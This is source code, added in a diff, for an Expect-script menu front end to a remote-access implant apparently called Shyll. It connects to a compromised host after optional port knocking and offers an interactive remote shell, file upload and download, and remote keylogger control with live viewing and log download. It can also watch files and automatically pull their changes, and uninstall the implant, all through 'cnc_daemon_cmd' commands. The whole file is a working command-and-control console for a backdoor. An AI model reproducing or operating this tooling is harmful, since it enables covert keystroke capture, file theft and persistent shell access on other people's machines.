@@ -1,0 +1,864 @@
+#!/bin/expect -f
+
+if { $::argc < 3 } {
+  puts "shyll-gui-expect.ext <shyll_path> <remote_ip> <password>"
+  exit 1
+}
+
+set shyll_path [file normalize [lindex $argv 0]]
+set remote_ip [lindex $argv 1]
+set password [lindex $argv 2]
+
+if { $password eq "" } {
+  puts "Error you must specify a password."
+  exit 1
+}
+
+set home_path [string trimright [ exec realpath "." ]]
+set download_dest_path "$home_path/download"
+set interrupted 0
+
+trap {
+  global interrupted
+  set interrupted 1
+} SIGINT
+
+proc setup_local_download_folder {} {
+  global download_dest_path
+
+  if {[catch { 
+    exec bash -c "
+      whiptail \
+        --title \"File Download\" --yesno --defaultno \"By default, files downloaded will be placed into: $download_dest_path\n\nWould you like to change the destination path?\" 12 60 \
+        3>&1 1>/dev/tty 2>&3"
+    }]
+  } {
+    puts "No"
+  } else {
+    set folder [local_folder_select]
+    set download_dest_path $folder
+  }
+}
+
+proc remote_file_download_to {src dest_name} {
+  global home_path
+  global download_dest_path
+
+  puts "Downloading file: \"$src\"; This may take awhile..."
+  set r [run_remote_cmd "cat \"$src\""]
+  
+  set dest_folder $download_dest_path
+  set dest_name_full "$dest_folder/$dest_name"
+
+  exec mkdir -p $dest_folder
+
+  set fh [open "$dest_name_full" "w"]
+  fconfigure $fh -translation binary -encoding binary
+
+  puts -nonewline $fh $r
+
+  close $fh
+
+  exec bash -c "
+    whiptail \
+    --title \"File Download\" --msgbox \"File downloaded to: $dest_name_full \" 12 60 \
+    3>&1 1>/dev/tty 2>&3
+  "
+}
+
+proc remote_file_download {src} {
+  set file_name [exec basename "$src"]
+
+  remote_file_download_to $src $file_name
+}
+
+proc remote_file_browse {} {
+  global download_dest_path
+
+  set timeout -1
+  
+  set filelist [run_remote_cmd "(ls -lpa | awk 'NR>2' | awk '{ printf \"'\"'\"'\" \$9 \"'\"'\"'\" \" \" \$5 \" \" }')"]
+  set curdir [string trimright [ run_remote_cmd "pwd" ]]
+  
+  if {[catch { 
+      exec bash -c "
+        whiptail \\
+        --title \"Select Remote File\" --menu \"> $curdir\n\" 16 60 6 \\
+        $filelist \\
+        3>&1 1>/dev/tty 2>&3"
+      } result]
+    } {
+      return ""
+    } else {
+      set c $result
+    }
+
+  if {[string match */ $c]} {
+    send "cd '$c'\n"
+    return [remote_file_browse]
+  }
+
+  return "$curdir/$c"
+}
+
+proc local_file_browse {} {
+  global download_dest_path
+
+  set timeout -1
+  
+  set filelist [exec /bin/bash -c "(ls -lpa | awk 'NR>2' | awk '{ printf \"'\"'\"'\" \$9 \"'\"'\"'\" \" \" \$5 \" \" }')"]
+  set curdir [string trimright [ exec pwd ]]
+  
+  if {[catch { 
+      exec bash -c "
+        whiptail \\
+        --title \"Local File Browse\" --menu \"> $curdir\n\" 16 60 6 \\
+        $filelist \\
+        3>&1 1>/dev/tty 2>&3"
+      } result]
+    } {
+      return ""
+    } else {
+      set c $result
+    }
+
+  if {[string match */ $c]} {
+    cd $c
+    return [local_file_browse]
+  }
+
+  return "$curdir/$c"
+}
+
+proc remote_folder_select {} {
+  set timeout -1
+  
+  set filelist [run_remote_cmd "(ls -lp | awk '\$1 ~/d.*/' | awk '{ printf \"'\"'\"'\" \$9 \"'\"'\"'\" \" \" \$5 \" \" }')"]
+  set curdir [string trimright [ run_remote_cmd "pwd" ]]
+
+  puts $filelist
+  
+  if {[catch { 
+      exec bash -c "
+        whiptail \\
+        --title \"Remote Folder Select\" --ok-button \"Enter Folder\" --cancel-button \"Select Current Folder\" --menu \"> $curdir\n\" 16 80 6 \\
+        '../' ' ' $filelist \\
+        3>&1 1>/dev/tty 2>&3"
+      } result]
+    } {
+      return $curdir
+    } else {
+      set c $result
+    }
+
+  if {[string match */ $c]} {
+    send "cd '$c'\n"
+    return [remote_folder_select]
+  }
+
+  return "$curdir/$c"
+}
+
+proc local_folder_select {} {
+  set timeout -1
+  
+  set filelist [exec bash -c "(ls -lp | awk '\$1 ~/d.*/' | awk '{ printf \"'\"'\"'\" \$9 \"'\"'\"'\" \" \" \$5 \" \" }')"]
+  set curdir [string trimright [ exec bash -c "pwd" ]]
+  
+  if {[catch { 
+      exec bash -c "
+        whiptail \\
+        --title \"Local Folder Select\" --ok-button \"Enter\" --cancel-button \"Current Folder\" --menu \"> $curdir\n\" 16 80 6 \\
+        '../' ' ' $filelist \\
+        3>&1 1>/dev/tty 2>&3"
+      } result]
+    } {
+      return $curdir
+    } else {
+      set c $result
+    }
+
+  if {[string match */ $c]} {
+    cd $c
+    return [local_folder_select]
+  }
+
+  return "$curdir/$c"
+}
+
+proc run_remote_cmd {cmd} {  
+  set endtoken [exec shuf -i 1000000000-9999999999 -n 1]
+  
+  set start "__START__$endtoken"
+  set end "__DONE__$endtoken"
+
+  send "x=$endtoken; printf __START__\$x; ($cmd | gzip -c | base64 -w0 ) ; printf __DONE__\$x\n"
+  
+  set timeout -1
+  expect {
+  -re "${start}(.*)${end}"  {
+      set r $expect_out(1,string)
+      
+      file tempfile tempfilename /tmp/f
+
+      exec /bin/bash -c "echo -n \"$r\" | base64 -d | gzip -d > $tempfilename" 
+
+      set input_file [open $tempfilename "rb" ]
+      fconfigure $input_file -translation binary 
+      set decoded [read $input_file]
+      close $input_file
+
+      file delete $tempfilename
+
+      return $decoded
+    }
+  }
+}
+
+proc run_remote_cmd_dbg {cmd} {  
+  set endtoken [exec shuf -i 1000000000-9999999999 -n 1]
+  
+  set start "__START__$endtoken"
+  set end "__DONE__$endtoken"
+
+  send "x=$endtoken; printf __START__\$x; ($cmd | gzip -c | base64 -w0 ) ; printf __DONE__\$x\n"
+  
+  set timeout -1
+  expect {
+  -re "${start}(.*)${end}"  {
+      set r $expect_out(1,string)
+      
+      file tempfile tempfilename /tmp/f
+
+      exec /bin/bash -c "echo -n \"$r\" | base64 -d | gzip -d > $tempfilename" 
+
+      set input_file [open $tempfilename "rb" ]
+      fconfigure $input_file -translation binary 
+      set decoded [read $input_file]
+      
+      close $input_file
+
+      file delete $tempfilename
+
+      return $decoded
+    }
+  }
+}
+
+proc cmd_upload_file {} {
+  remote_folder_select
+  set f [ local_file_browse ]
+
+  if { $f eq "" } {
+    return
+  }
+
+  set endtoken [exec shuf -i 1000000000-9999999999 -n 1]
+  
+  set out_file_name [exec basename "$f"]
+
+  puts "Writing $f to $out_file_name"
+  
+  send "read -r encoded && echo -n \$encoded | base64 -d -w0 | gzip -d > '$out_file_name'\n"
+  
+  file tempfile tempfilename /tmp/f
+
+  exec /bin/bash -c "cat \"$f\" | gzip -c | base64 -w0 > $tempfilename" 
+
+  set input_file [open $tempfilename "rb" ]
+  fconfigure $input_file -translation binary 
+  set encoded [read $input_file]
+  close $input_file
+  file delete $tempfilename
+
+  send "$encoded\n"
+  send "x=$endtoken; echo done\$x\n"
+  expect "done$endtoken"
+  
+  return
+}
+
+proc cmd_download_file {} {
+  set f [remote_file_browse]
+
+  if { $f eq "" } {
+    return
+  }
+
+  remote_file_download $f
+}
+
+proc interactive_off {} {
+  log_user 0
+  send "PS1=\"\"\n"
+  send "echo interactive mode off\n"
+  expect "interactive mode off"
+
+  # In case a command was left running, we want an interactive terminal (for the expect script)
+  # so we send CTRL + C
+  send "\003"
+}
+
+proc interactive_on {} {
+  puts -nonewline \033\[2J\033\[H
+  flush stdout
+
+  puts "Entering an interactive shell on the remote.\n\nType 'ESC' to leave this interactive shell.\n"
+  send "echo Session started...\n"
+  expect "Session started..."
+
+  send "PS1=\"# \"\n"
+  expect "#"
+  puts -nonewline "# "
+  flush stdout
+
+  log_user 1
+}
+
+proc cmd_enter_shell {} {
+  interactive_on
+
+  interact {
+    "\x1b" {
+      interactive_off
+      return
+    }
+  }
+
+}
+
+proc cmd_download_keylog {} {
+  set keylog_file [ get_keylog_file ]
+
+  if { $keylog_file eq "" } {
+    exec bash -c {
+      whiptail \
+      --title "Error" --msgbox "Keylogger is not currently active. No log file to download." 12 60 \
+      3>&1 1>/dev/tty 2>&3
+    }
+    return
+  }
+
+  remote_file_download_to $keylog_file "keylog.txt"
+}
+
+proc cmd_interrogate_keylog {} {
+  send "cnc_daemon_cmd keylog status\n"
+  expect {
+    "Keylogger status: Not Active" {
+      exec bash -c {
+        whiptail \
+        --title "Keylog Status" --msgbox "Keylogger is not currently active..." 12 60 \
+        3>&1 1>/dev/tty 2>&3
+      }
+    }
+    -re {Keylogger status: Logging to:\s*(.*);} {
+      set r [string trim $expect_out(1,string)]
+      exec bash -c "
+        whiptail \
+        --title \"Keylog Status\" --msgbox \"Keylogger is active & logging to: $r \" 12 60 \
+        3>&1 1>/dev/tty 2>&3
+      "
+    }
+  }
+}
+
+proc get_keylog_file {} {
+  send "cnc_daemon_cmd keylog status\n"
+  
+  expect {
+    "Keylogger status: Not Active" {
+      return ""
+    }
+    -re {Keylogger status: Logging to:\s*(.*);} {
+      set r [string trim $expect_out(1,string)]
+      return $r
+    }
+  }
+}
+
+proc cmd_enable_keylog {} {
+  send "cnc_daemon_cmd keylog start\n"
+  send "cnc_daemon_cmd keylog status\n"
+  
+  expect {
+    "Keylogger status: Not Active" {
+      puts "Error invoking keylogger."
+      return ""
+    }
+    -re {Keylogger status: Logging to:\s*(.*);} {
+      set r [string trim $expect_out(1,string)]
+      return $r
+    }
+  }
+}
+
+proc cmd_disable_keylog {} {
+  send "cnc_daemon_cmd keylog stop\n"
+  send "cnc_daemon_cmd keylog status\n"
+  
+  expect "Keylogger status: Not Active"
+}
+
+proc cmd_interactive_keylog {} {
+  set keylog_file [ cmd_enable_keylog ]
+
+
+  puts "Entering interactive keylogging session.\n"
+  interactive_on
+
+  send "tail -f \"$keylog_file\"\n"
+
+  interact {
+    "\x1b" {
+      interactive_off
+      return
+    }
+    "\x03" {
+      interactive_off
+      return
+    }
+  }
+}
+
+proc cmd_add_watch_file {} {
+  set f [remote_file_browse]
+
+  if { $f eq "" } {
+    return
+  }
+
+  send "cnc_daemon_cmd notify add \"$f\"\n"
+
+  expect {
+    "File watch added successfully." {
+      return
+    }
+    "Error adding this file to watch list." {
+
+        exec bash -c {
+          whiptail \
+          --title "Error" --msgbox "Could not add this file to the watch list due to an error. Use shell command 'cnc_daemon_cmd watch add' for more details." 12 60 \
+          3>&1 1>/dev/tty 2>&3
+      }
+    }
+  }
+}
+
+proc cmd_add_watch_folder {} {
+  set f [remote_folder_select]
+
+  if { $f eq "" } {
+    return
+  }
+
+  send "cnc_daemon_cmd notify add \"$f\"\n"
+
+  expect {
+    "File watch added successfully." {
+      return
+    }
+    "Error adding this file to watch list." {
+
+        exec bash -c {
+          whiptail \
+          --title "Error" --msgbox "Could not add this file to the watch list due to an error. Use shell command 'cnc_daemon_cmd watch add' for more details." 12 60 \
+          3>&1 1>/dev/tty 2>&3
+      }
+    }
+  }
+}
+
+proc cmd_remove_watch {} {
+  set timeout -1
+  
+  set watch_list [run_remote_cmd {cnc_daemon_cmd notify list | sed -nE 's/- "(.*)";$/"\1" " "/p' | tr "\r\n" " "}]
+
+  
+  if { [string trim $watch_list] eq "" } {
+    exec bash -c {
+      whiptail \
+      --title "Error" --msgbox "Currently no active watches." 12 60 \
+      3>&1 1>/dev/tty 2>&3
+    }
+    return
+  }
+
+  if {[catch { 
+      exec bash -c "
+        whiptail \\
+        --title \"Watch Select\" --menu \"Select a watch to remove\" 16 60 6 \\
+        $watch_list \\
+        3>&1 1>/dev/tty 2>&3"
+      } result]
+    } {
+      return
+    } else {
+      set f $result
+    }
+
+    send "cnc_daemon_cmd notify remove \"$f\"\n"
+
+    expect {
+      "File watch was removed." {
+        return
+      }
+    }
+}
+
+proc cmd_watch_list {} {
+  set timeout -1
+  
+  set watch_list [run_remote_cmd {cnc_daemon_cmd notify list | sed -nE 's/- "(.*)";$/"\1" " "/p' | tr "\r\n" " "}]
+
+  
+  if { [string trim $watch_list] eq "" } {
+    exec bash -c {
+      whiptail \
+      --title "Error" --msgbox "Currently no active watches." 12 60 \
+      3>&1 1>/dev/tty 2>&3
+    }
+    return
+  }
+
+  exec bash -c "
+      whiptail \\
+      --nocancel --ok-button \"Return\" --title \"Watch List\" --menu \"List of current watches\" 16 60 6 \\
+      $watch_list \\
+      3>&1 1>/dev/tty 2>&3"
+}
+
+proc get_watch_log_file {} {
+  send "cnc_daemon_cmd notify status\n"
+  
+  expect {
+    -re {Notify is active. Log file:\s*(.*);} {
+      set r [string trim $expect_out(1,string)]
+      return $r
+    }
+  }
+}
+
+proc cmd_show_watch_log {} {
+  set logfile [ get_watch_log_file ]
+
+  puts "Entering interactive watch session.\n"
+  interactive_on
+
+  send "tail -f \"$logfile\"\n"
+
+  interact {
+    "\x1b" {
+      interactive_off
+      return
+    }
+    "\x03" {
+      interactive_off
+      return
+    }
+  }
+}
+
+proc cmd_download_watch_delta {} {
+  global download_dest_path
+  global interrupted
+
+  puts -nonewline \033\[2J\033\[H
+  puts "Watching for new changes to files being watched. Changes will be downloaded...\n\n"
+  puts "Type \"CTRL + C\" to return to the main menu.\n"
+
+  set logfile [ get_watch_log_file ]
+
+  set timeout -1
+
+  set t [exec shuf -i 1000000000-9999999999 -n 1]
+  send "tail -n 0 -f $logfile | xargs -i sh -c 'x=$t; echo -n \"\$x.entry{}:::\"; cat {} | gzip -c | base64 -w0; echo -n \";\"'\n"
+
+  set interrupted 0
+
+  while {1} {
+    set timeout 1
+    expect {
+      -re "$t.entry(.+):::(.+);" {
+        set full_source_name $expect_out(1,string)
+        set data [string trim $expect_out(2,string)]
+        set curtime [string trim [exec date]]
+        
+        if {[regexp "^cat:\s*.*: Is a directory" $data]} {
+          puts "$curtime: Detected changes in directory: \"$full_source_name\""
+        } else {
+          puts "$curtime: Detected change to file: $full_source_name; downloading changes..."
+
+          set file_name [exec basename "$full_source_name"]
+          set dest_name "$download_dest_path/$file_name"
+
+          exec /bin/bash -c "echo -n \"$data\" | base64 -d | gzip -d > $dest_name" 
+
+          puts " - Results saved to $dest_name"
+        }
+      }
+      timeout {
+        if { $interrupted eq 1 } {
+          set interrupted 0
+          send "\003"
+          return
+        }
+      }
+    }
+  }
+}
+
+proc cmd_uninstall {} {
+
+  send "cnc_daemon_cmd admin delete\n"
+  
+  expect {
+    "Deleted shyll from host machine." {
+      exec bash -c {
+          whiptail \
+          --title "Uninstall" --msgbox "Shyll has been uninstalled from the remote machine." 12 60 \
+          3>&1 1>/dev/tty 2>&3
+      }
+    }
+    "Error uninstalling." {
+      exec bash -c {
+          whiptail \
+          --title "Uninstall" --msgbox "Unable to uninstall Shyll. An error occured." 12 60 \
+          3>&1 1>/dev/tty 2>&3
+      }
+    }
+  }
+}
+
+proc menu_file_transfer {} {
+  while {1} {
+    set c [ exec bash -c {
+        whiptail \
+        --nocancel --title "Command Selection" --menu "Select a Command" 16 80 3 \
+        "Main Menu" "Return to the main menu" \
+        "Upload" "Upload a file to remote" \
+        "Download" "Download a file from remote" \
+        3>&1 1>/dev/tty 2>&3
+    }]
+
+    switch $c {
+      "Main Menu" {
+        return
+      }
+      "Upload" {
+        cmd_upload_file
+      }
+      "Download" {
+        cmd_download_file
+      }
+      default {
+        puts "What is this? \"$c\""
+        exit 0
+      }
+    }
+  }
+}
+
+proc menu_keylog {} {
+  while {1} {
+    set c [ exec bash -c {
+        whiptail \
+        --nocancel --title "Command Selection" --menu "Select a Command" 12 60 5 \
+        "Main Menu" "Return to the main menu" \
+        "Status" "Check the status of keylog service" \
+        "Enable" "Enable background keylog service" \
+        "Disable" "Disable background keylog service" \
+        "Download" "Download the keylog file" \
+        "Interactive" "Start an interactive keylog session" \
+        3>&1 1>/dev/tty 2>&3
+    }]
+
+    switch $c {
+      "Main Menu" {
+        return
+      }
+      "Status" {
+        cmd_interrogate_keylog
+      }
+      "Enable" {
+        cmd_enable_keylog
+      }
+      "Disable" {
+        cmd_disable_keylog
+      }
+      "Interactive" {
+        cmd_interactive_keylog
+      }
+      "Download" {
+        cmd_download_keylog
+      }
+      default {
+        puts "What is this? \"$c\""
+        exit 0
+      }
+    }
+  }
+}
+
+
+proc menu_watches {} {
+  while {1} {
+    set c [ exec bash -c {
+        whiptail \
+        --nocancel --title "Command Selection" --menu "Select a Command" 12 60 5 \
+        "Main Menu" "Return to the main menu" \
+        "Interactive Download" "Watch for changs & download" \
+        "Watch List" "Remove item from the watch list" \
+        "Add File" "Add file to the watch list" \
+        "Add Folder" "Add folder to the watch list" \
+        "Remove Watch" "Remove item from the watch list" \
+        "Log" "View the file watch log" \
+        3>&1 1>/dev/tty 2>&3
+    }]
+
+    switch $c {
+      "Main Menu" {
+        return
+      }
+      "Interactive Download" {
+        cmd_download_watch_delta
+      }
+      "Add File" {
+        cmd_add_watch_file
+      }
+      "Add Folder" {
+        cmd_add_watch_folder
+      }
+      "Remove Watch" {
+        cmd_remove_watch
+      }
+      "Watch List" {
+        cmd_watch_list
+      }
+      "Log" {
+        cmd_show_watch_log
+      }
+      default {
+        puts "What is this? \"$c\""
+        exit 0
+      }
+    }
+  }
+}
+
+proc main_menu {} {
+  while {1} {
+    set c [ exec bash -c {
+        whiptail \
+        --nocancel --title "Command Selection" --menu "Select a Command" 12 60 5 \
+        "Shell"     "Drop into an interactive remote shell" \
+        "File-Transfer"  "Download or upload files" \
+        "Keylog"    "Configure keylogger & logs" \
+        "Watches"    "Configure file watches & logs" \
+        "Uninstall" "Uninstall server from remote" \
+        "Disconnect" "Disconnect from remote & exit" \
+        3>&1 1>/dev/tty 2>&3
+    }]
+
+    switch $c {
+      "Shell" {
+        cmd_enter_shell
+      }
+      "File-Transfer" {
+        menu_file_transfer
+      }
+      "Keylog" {
+        menu_keylog
+      }
+      "Watches" {
+        menu_watches
+      }
+      "Uninstall" {
+        cmd_uninstall
+      }
+      "Disconnect" {
+        exit 0
+      }
+      default {
+        puts "What is this? \"$c\""
+        exit 0
+      }
+    }
+  }
+}
+
+proc establish_connection {} {
+  global spawn_id
+  global expect_out
+  
+  global shyll_path
+  global remote_ip
+  global password
+
+
+  while {1} {
+    if { [ catch {
+      exec whiptail --yesno \
+      --no-button "Skip Knocking" --yes-button "Port Knock" \
+      "Will now attempt to establish a connection.\n\nDo you want to port-knock first?" \
+      10 60 >@ stdout 2>@ stderr
+      }] } {
+
+      puts "Skipping port knocking"
+    } else {
+      spawn $shyll_path knock $remote_ip --password $password 3>&1 1>/dev/tty 2>&3
+      
+      set timeout -1
+      expect "Done"
+    }
+
+    spawn stdbuf -o0 -e0 -i0 $shyll_path connect $remote_ip --password $password
+
+    set timeout -1
+
+    expect {
+      "Connection established, " {
+        expect "Interactive session is ready!"
+
+        exec bash -c {
+            whiptail \
+            --title "Connected!" --msgbox "Connection has been established!\n\nPress enter to proceed to main menu" 12 60 \
+            3>&1 1>/dev/tty 2>&3
+        }
+        
+        interactive_off
+
+        main_menu
+      }
+      "Error connecting to remote"
+      {
+        expect eof
+        if {[ catch {
+          exec whiptail --yesno \
+          --no-button "Abort" --yes-button "Retry" \
+          "Failed to connect to the remote. You may be using the wrong password. Would you like to try again?" \
+          10 60 >@ stdout 2>@ stderr
+          }]} {
+            puts "Unable to establish connection with remote. Terminating..."
+            exit 1
+          }
+      }
+    }
+  }
+}
+
+setup_local_download_folder
+
+set result [catch {
+    establish_connection
+  } msg]
+
+if { $result != 0 } {
+  exec bash -c {
+      whiptail \
+      --title "Error" --msgbox "Unexpected error, remote may have unexpectedly disconnected!\n\nTerminating..." 12 60 \
+      3>&1 1>/dev/tty 2>&3
+  }
+  puts "Detailed error log follows:\n$msg"
+}
+
